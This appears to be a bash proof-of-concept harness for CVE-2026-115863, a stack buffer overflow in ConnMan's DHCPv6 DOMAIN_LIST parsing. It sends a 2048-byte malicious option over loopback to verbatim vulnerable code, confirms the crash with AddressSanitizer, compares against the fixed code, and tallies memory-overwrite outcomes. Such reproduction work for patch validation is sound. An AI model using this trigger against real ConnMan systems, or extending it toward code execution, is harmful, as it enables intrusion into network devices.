#!/bin/bash
# CVE-2026-115863 — loopback-wire harness.
# Includes VERBATIM dhcpv6_get_option() from pinned tag-2.0 gdhcp/common.c and
# the three VERBATIM client.c functions. A separate sender process delivers a
# raw DHCPv6 REPLY-shaped packet (option 24, len 2048) over a 127.0.0.1 UDP
# socket to the receiver process that runs ConnMan's option parser and caller
# chain. No connmand daemon, external network or full ConnMan build.
export ASAN_OPTIONS=detect_leaks=0
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E"
rm -f "$E"/*.log "$E"/*.out get_option_fn.inc get_domains_fn.inc \
      get_ov_list_fn.inc get_request_fn.inc a-loop a-fixed p-loop
PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }
hasnt() { if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi; }
srcsha() { sha256sum "$1" | cut -d' ' -f1; }
BASE=../../frontier/connman2shell/src
SRC=$BASE/client-2.0.c
FIX=$BASE/client-2.0-fixed.c
COMMON=$BASE/common-2.0.c

[ "$(srcsha "$SRC")" = 722cccc072d658f6c9fded507e1deab8cd8a8837479c9215c88a4834f81fcb0f ] \
  && ok "pin-2.0-client-sha256" || no "pin-2.0-client-sha256"
[ "$(srcsha "$FIX")" = d252cf019c960a3a9a60501429155cead2876269c79ab1cca7443b787f3c5c0e ] \
  && ok "fixed-client-sha256" || no "fixed-client-sha256"
[ "$(srcsha "$COMMON")" = 2ff01d8b8d8347fad8876092035a3acfc38fb9048b2ea0da8be90c43af73eada ] \
  && ok "pin-2.0-common-sha256" || no "pin-2.0-common-sha256"
[ "$(srcsha driver.c)" = 76d37f72d87aa7811abb1958835579b50f8086d652b0471e99b5c64e986c3b37 ] \
  && ok "driver-sha256" || no "driver-sha256"

ext() { sed -n "$2" "$1"; }
ext "$COMMON" '/^uint8_t \*dhcpv6_get_option/,/^}/p' > /tmp/c2l-option.inc
ext "$SRC" '/^static GList \*get_domains/,/^}/p' > /tmp/c2l-domains.inc
ext "$SRC" '/^static GList \*get_dhcpv6_option_value_list/,/^}/p' > /tmp/c2l-ov.inc
ext "$SRC" '/^static void get_dhcpv6_request/,/^}/p' > /tmp/c2l-req.inc
ext "$FIX" '/^static GList \*get_domains/,/^}/p' > /tmp/c2lf-domains.inc
ext "$FIX" '/^static GList \*get_dhcpv6_option_value_list/,/^}/p' > /tmp/c2lf-ov.inc
ext "$FIX" '/^static void get_dhcpv6_request/,/^}/p' > /tmp/c2lf-req.inc

[ "$(srcsha /tmp/c2l-option.inc)" = d4dd43726a18c8401420283af4c36ed396c0895f181697c03c16bd184ccfccd3 ] \
  && ok "verbatim-dhcpv6_get_option-sha256" || no "verbatim-dhcpv6_get_option-sha256"
[ "$(srcsha /tmp/c2l-domains.inc)" = 090d8ea201196ea32892c95aaeb38d5b2a99c9a8ef41c4d081782b8a6f60a5c2 ] \
  && ok "verbatim-vuln-get_domains-sha256" || no "verbatim-vuln-get_domains-sha256"
[ "$(srcsha /tmp/c2l-ov.inc)" = 0391d8e708902132249ce7e31d1d20bb6cecca7e029b09c9658a7a1950497414 ] \
  && ok "verbatim-get_ov_list-sha256" || no "verbatim-get_ov_list-sha256"
[ "$(srcsha /tmp/c2l-req.inc)" = b38eb6989a74b6dd81465a87a61afe700df24ecea6c90153a6f9e4acf2d4f812 ] \
  && ok "verbatim-get_request-sha256" || no "verbatim-get_request-sha256"
[ "$(srcsha /tmp/c2lf-domains.inc)" = 466360babe68e0cdf7abfa8d5e20c5dd7ad7bea05631ecf0f39f8f531241b0d9 ] \
  && ok "verbatim-fixed-get_domains-sha256" || no "verbatim-fixed-get_domains-sha256"
[ "$(srcsha /tmp/c2lf-ov.inc)" = 0391d8e708902132249ce7e31d1d20bb6cecca7e029b09c9658a7a1950497414 ] \
  && ok "verbatim-fixed-get_ov_list-sha256" || no "verbatim-fixed-get_ov_list-sha256"
[ "$(srcsha /tmp/c2lf-req.inc)" = b38eb6989a74b6dd81465a87a61afe700df24ecea6c90153a6f9e4acf2d4f812 ] \
  && ok "verbatim-fixed-get_request-sha256" || no "verbatim-fixed-get_request-sha256"

CFLAGS="-g -O0 -fno-omit-frame-pointer -fsanitize=address"
build() { # out, option-inc, domains-inc, ov-inc, req-inc
	cp "$2" get_option_fn.inc
	cp "$3" get_domains_fn.inc
	cp "$4" get_ov_list_fn.inc
	cp "$5" get_request_fn.inc
	gcc $CFLAGS -w driver.c -o "$1" 2>"$E/build-$1.log"
}
build a-loop /tmp/c2l-option.inc /tmp/c2l-domains.inc /tmp/c2l-ov.inc /tmp/c2l-req.inc \
  && ok "build-loop-asan" || no "build-loop-asan"
build a-fixed /tmp/c2l-option.inc /tmp/c2lf-domains.inc /tmp/c2lf-ov.inc /tmp/c2lf-req.inc \
  && ok "build-fixed-asan" || no "build-fixed-asan"

cp /tmp/c2l-option.inc get_option_fn.inc
cp /tmp/c2l-domains.inc get_domains_fn.inc
cp /tmp/c2l-ov.inc get_ov_list_fn.inc
cp /tmp/c2l-req.inc get_request_fn.inc
gcc -g -O0 -fno-omit-frame-pointer -DPLAIN -w driver.c -o p-loop \
  2>"$E/build-p-loop.log" && ok "build-loop-plain" || no "build-loop-plain"

# --- socket delivery: sender process -> 127.0.0.1 UDP -> receiver process ----
./a-loop attack 0x80 >"$E/loop-asan-attack.out" 2>&1; RC=$?
f="$E/loop-asan-attack.out"
srv=$(sed -n 's/^SRV EXIT=\([0-9-]*\) SIGNALED=\([0-9]*\).*/\1 \2/p' "$f")
[ "$srv" != "0 0" ] && ok "loop-asan-child-failed" || no "loop-asan-child-failed"
has "$f" "ERROR: AddressSanitizer: stack-buffer-overflow" "loop-asan-stack-overflow"
has "$f" "READ of size 1" "loop-asan-read-1"
has "$f" "get_domains" "loop-frame-get_domains"
has "$f" "get_dhcpv6_option_value_list" "loop-frame-get_ov_list"
has "$f" "get_dhcpv6_request" "loop-frame-get_request"
has "$f" "CLI SENT=2056 PKTLEN=2056 DST=127.0.0.1:" "sender-sent-2056-on-loopback"
has "$f" "WIREPARSE OLEN=2048 COUNT=1 OFFSET=8" "receiver-parser-delivers-2048-bytes"
has "$f" "WIRE MODE=attack PKTLEN=2056 LASTJUMP=80" "receiver-packet-reaches-chain"

# --- controls: fixed pin and well-formed short DOMAIN_LIST -------------------
./a-fixed attack 0x80 >"$E/fixed-asan-attack.out" 2>&1; FRC=$?
has "$E/fixed-asan-attack.out" "CHAIN DONE STATUS=0" "fixed-loop-clean-done"
hasnt "$E/fixed-asan-attack.out" "AddressSanitizer" "fixed-loop-no-asan"
[ "$FRC" -eq 0 ] && ok "fixed-loop-clean-exit" || no "fixed-loop-clean-exit"

./a-loop safe >"$E/loop-asan-safe.out" 2>&1; SRC_RC=$?
has "$E/loop-asan-safe.out" "WIREPARSE OLEN=8 COUNT=1 OFFSET=8" "safe-parser-olen-8"
has "$E/loop-asan-safe.out" "CHAIN DONE STATUS=0" "vuln-loop-safe-clean-done"
hasnt "$E/loop-asan-safe.out" "AddressSanitizer" "vuln-loop-safe-no-asan"
[ "$SRC_RC" -eq 0 ] && ok "vuln-loop-safe-clean-exit" || no "vuln-loop-safe-clean-exit"

# --- store landing, plain build, 12 repetitions ------------------------------
store=0; none=0; crash=0
for n in $(seq 1 12); do
	o="$E/loop-plain-$n.out"
	./p-loop attack 0x80 >"$o" 2>&1
	s=$(sed -n 's/^SRV SIGNALED=\([0-9]*\).*/\1/p' "$o")
	if [ "${s:-0}" -ne 0 ]; then crash=$((crash + 1)); continue; fi
	d=$(sed -n 's/^CANARY DOTS=\([0-9]*\).*/\1/p' "$o")
	if [ "${d:-0}" -gt 0 ]; then store=$((store + 1)); else none=$((none + 1)); fi
done
printf 'PLAIN_OUTCOMES store=%d none=%d crash=%d total=12\n' "$store" "$none" "$crash"
printf 'OBS outcome mix is ASLR-dependent; no category is a pass criterion.\n'

printf 'SUMMARY=%d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
